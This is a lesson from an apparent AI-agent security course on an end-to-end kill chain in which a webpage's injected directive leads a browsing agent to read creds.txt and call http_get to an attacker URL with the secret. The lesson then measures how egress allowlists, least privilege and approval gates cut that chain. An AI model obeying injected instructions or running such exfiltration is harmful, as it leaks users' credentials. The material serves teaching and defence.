<div class="prereq">

**Prerequisites.** [16.1 agent surface](../module-16/lesson-01.md), [17.1 tool poisoning](../module-17/lesson-01.md),
[05.1 indirect injection](../module-05/lesson-01.md), [01.1 SSRF/exfiltration](../module-01/lesson-01.md),
[14.1 RAG poisoning](../module-14/lesson-01.md). Lab: shared agent runtime, offline.

**You will learn.** How the individual attacks compose into a realistic **end-to-end kill chain** —
webpage → browsing agent → indirect injection → tool call → credential read → exfiltration — and how
**defense-in-depth** breaks it: each enforced control cuts the chain at a different hop, and breaking
any one link stops the whole attack. You measure **chain depth** as a defense metric.

**Why this matters.** Real incidents are chains, not single bugs. Thinking in chains is how you both
attack (find the full path) and defend (find the cheapest link to cut). This lesson is the synthesis
of Stage 7 and the template for the agent capstone.

</div>

# 18.1 · End-to-end attack chains

## Why this matters

No single control makes an agent "safe"; security is about the *composition*. An attacker chains
low-privilege footholds (a page they can influence) into high-privilege outcomes (your credentials
leaving the building) by hopping across trust boundaries the system never explicitly drew. Defenders
win by recognizing the chain and cutting the cheapest, highest-impact link — usually the last one
(egress) or a needless capability (filesystem on a research agent).

## Learning objectives

1. Trace a complete multi-hop agent kill chain and identify every trust-boundary crossing.
2. Reproduce it locally end to end and measure **chain depth** (executed hops).
3. Apply **defense-in-depth** and show where each enforced control bites; explain why breaking any
   link suffices.
4. Compute **chain-success probability** as a product over hops and justify defense-in-depth
   quantitatively.
5. Design the **minimal** control set that stops the chain while preserving the legitimate task.

## Concept

### The chain

```text
[attacker-influenced webpage on a legit host]
   │ agent fetches it (browsing is its job)          ← boundary: web (untrusted) → context
   ▼
( agent reads page ) --injected directive-->         ← boundary: data → instructions (M05)
   │ CALL read_file(creds.txt)
   ▼
( agent reads creds ) --creds carry exfil directive-->← boundary: secret → context
   │ CALL http_get(attacker?d=SECRET)
   ▼
( agent fetches attacker URL ) → SECRET at the sink  ← boundary: internal → external (egress)
```

Four crossings, each a place the system implicitly promoted untrusted→trusted or internal→external.
The lab runs exactly this: 3 executed tool calls, canary at the sink.

### Defense-in-depth: cut any link

Because the chain must complete *every* hop, breaking **any** one stops it. The lab measures where
each enforced control bites (chain depth = executed hops before it's cut):

| Control | Cuts at | Chain depth | Note |
|---|---|---|---|
| none | — | 3 | exfiltrates |
| egress allowlist | final exfil hop | 2 | browse+read still run; exfil host denied |
| least privilege (no `read_file`) | read hop | 1 | research agent needs no filesystem |
| approval gate on egress | first egress | 0 | also blocks legit browsing (utility cost) |

Earlier cuts = smaller blast radius, but also potentially more utility loss (the approval gate blocks
the legitimate fetch too). The engineering task is choosing controls that cut the chain while
preserving the task — usually **least privilege** (remove capabilities the task doesn't need) plus
**egress control** (the last-hop backstop).

## Intuition

A burglary needs: find an open window, get inside, find the safe, crack it, carry the loot out the
door. Guard *any* step and the burglary fails — but a barred window (least privilege: no way in to
that room) is cheaper and less annoying than stationing a guard who frisks everyone leaving
(approval on all egress, which also delays honest employees). Defense-in-depth means you don't rely
on one guard; you bar the windows the business doesn't use *and* watch the door. Measuring chain
depth tells you which barrier the intruder reached before being stopped.

## Technical explanation & Code

`labs/lab-18/chain.py` on the shared runtime: `web[page]` holds the attacker page (injects
`read_file`), `files['creds.txt']` injects the exfil `http_get` with `SECRET` (substituted to the
real canary), and the loop observes each result and continues — a genuine multi-step chain. Defenses
are `Policy` variants; `chain_depth` counts executed hops. The page sits on an allowlisted
`research.test` host so browsing is legitimately allowed, letting later controls bite at later hops.

## Mathematics

**Chain-success probability.** If hop $i$ succeeds with probability $p_i$ (attacker lands the
injection *and* the control, if any, permits it), the chain succeeds with
$$ P(\text{chain}) = \prod_{i=1}^{H} p_i. $$
A single enforced control that drives some $p_i \to 0$ zeroes the product — the quantitative form of
"break any link." Probabilistic controls (a filter with pass-through $q_i$) instead multiply:
defense-in-depth over $k$ independent probabilistic controls on a hop gives residual $\prod_k q_k$,
shrinking geometrically. So: prefer one **enforced** control that zeroes a hop; stack **probabilistic**
controls only where you can't get an enforced one. This is why least-privilege/egress (enforced)
beat stacking input filters (probabilistic) — and why you still stack the filters you have.

**Chain depth as a metric.** Executed-hops-before-cut lower-bounds the attacker's achieved
privilege and upper-bounds residual blast radius; minimizing it (cut earlier) is a concrete defense
objective you can regression-test in CI.

## Attack / Defense model

<div class="callout guarantee">

**Guarantee analysis — layered agent controls on a kill chain.**
- **Stops:** the chain, as long as at least one hop is cut by an *enforced* control (egress allowlist
  and least privilege each do so here, independent of the model being fully hijacked).
- **Does NOT stop:** a chain that stays entirely within granted capabilities and allowlisted
  destinations (e.g. exfil via an *allowed* host, or damage using a tool the task legitimately needs);
  memory-persistence re-firing; social-engineered approvals.
- **Attacker adapts:** route exfil through an allowlisted destination, use only granted tools,
  poison memory for persistence, or find a hop you didn't control.
- **Cost:** earlier cuts can hurt utility (approval-on-all-egress blocks legit browsing); maintaining
  allowlists/capabilities is operational work.
- **Takeaway:** enumerate the chain, cut the cheapest high-impact link with an enforced control
  (usually least privilege + egress), and keep probabilistic controls (input provenance, monitoring)
  as depth — measure chain depth and guard it against regressions.

</div>

## Practical lab

<div class="lab">

**Lab 18** ([`labs/lab-18/`](../../labs/lab-18/README.md)) — full chain + layered defenses measured by
chain depth. Offline, shared runtime.

```bash
py labs/lab-18/chain.py
py -m pytest labs/lab-18 -q
```

</div>

## Exercise

1. **Map & reproduce.** Draw the DFD (00.1) for the chain, marking all four boundary crossings.
   Reproduce it and confirm chain depth 3 + exfil.
2. **Where each control bites.** Reproduce the depth-2 / depth-1 / depth-0 cuts; for each, state the
   hop cut and the *utility* cost (what legitimate behavior it also blocks).
3. **Chain-success math.** Assign plausible per-hop success probabilities; compute $P(\text{chain})$
   and show how one enforced control (→0) vs stacking two probabilistic filters ($q_1 q_2$) changes
   it. Argue which to deploy first.
4. **Memory persistence (purple team).** Add a memory hop: the injection writes to the agent's memory
   so the attack re-fires on the *next* task without the page. Show it, then defend (treat memory as
   untrusted on read; scope what can be written) and re-measure.
5. **RAG-entry variant.** Replace the webpage with a poisoned retrieved doc (Lab 14) as the chain
   entry; show the same downstream chain and that provenance (M15) + egress (M18) together break it.
6. **Minimal control set.** For a research assistant that must browse and summarize (but never needs
   the filesystem or arbitrary egress), design the smallest policy that stops all the above chains
   while preserving the task. Write the guarantee box.

<details><summary>Hint (step 3)</summary>

An enforced control makes its hop's $p_i=0$, so $P(\text{chain})=0$ regardless of the other hops —
one good barred window ends it. Two probabilistic filters on the same hop give residual $q_1q_2$
(e.g. $0.3\times0.3=0.09$): better, but nonzero. Deploy the enforced control first (least
privilege/egress); use filters as additional depth where no enforced control exists.

</details>

**Deliverable.** The DFD, reproduced chain, the three cut points with utility costs, the
chain-probability computation, the memory-persistence attack+defense, the RAG-entry variant, and the
minimal-policy design + guarantee box.

```bash
py course.py complete 18.1
```

## Research paper

**Greshake et al. (2023)** (indirect injection, the chain's engine) + **OWASP LLM06 / Agentic AI
guidance** (excessive agency, the amplifier). *Why:* together they describe exactly the compromise
you built — untrusted content reaching an over-privileged agent. *Read:* Greshake's real-world
chains (retrieval/web → tool actions) and OWASP's layered mitigations. *Reproduce:* the lab is the
executable chain; add one real-world variant from Greshake (e.g. an email-reading agent) as a new
entry hop. *Limits:* real agents have many tools and long horizons — chains are longer and controls
must be complete-mediation (every tool call authorized), not spot checks.

## Further reading

- MITRE ATLAS end-to-end case studies (multi-stage ML attacks);
  [`references/standards-map.md`](../../references/standards-map.md).
- Back-links: M14 (RAG entry), M15 (tenant leakage as a hop), M17 (tool poisoning as entry).

## Assessment

<details><summary>Q1. Why does breaking any single link stop the chain?</summary>

Because the chain succeeds only if *every* hop succeeds: $P(\text{chain})=\prod_i p_i$. An enforced
control that drives one hop's $p_i$ to 0 zeroes the product regardless of the other hops. That's the
quantitative basis for defense-in-depth — you don't need to defend every hop, just cut one reliably.

</details>

<details><summary>Q2. Why is chain depth a useful defense metric?</summary>

It counts executed hops before the attack is cut, which lower-bounds the attacker's achieved
privilege and upper-bounds residual blast radius. Cutting earlier (smaller depth) means less exposure;
it's a concrete, measurable objective you can regression-test — but it must be weighed against the
utility cost of earlier cuts.

</details>

<details><summary>Q3. When should you prefer least privilege over an approval gate?</summary>

When the task doesn't need the capability at all: removing it (least privilege) zeroes the hop
enforced and with no utility cost, whereas an approval gate on a needed capability adds latency/human
load and can be socially engineered or rubber-stamped. Use approval gates only for high-impact
actions the task genuinely requires; remove everything it doesn't.

</details>

## What you should now be able to do

- Trace and reproduce a full agent kill chain and enumerate its trust-boundary crossings.
- Measure chain depth and place enforced controls to cut the chain early while preserving the task.
- Quantify chain-success probability and justify enforced-first, then probabilistic, defense-in-depth.
- Defend memory-persistence and RAG-entry variants and design a minimal control set.

## Progress checkpoint

```bash
py course.py complete 18.1
py course.py next
```

**Next:** Stage 8 (fast-moving) — 19.1 · MCP security: architecture, trust boundaries, malicious
servers/tools, tool poisoning through MCP, and capability/permission models.
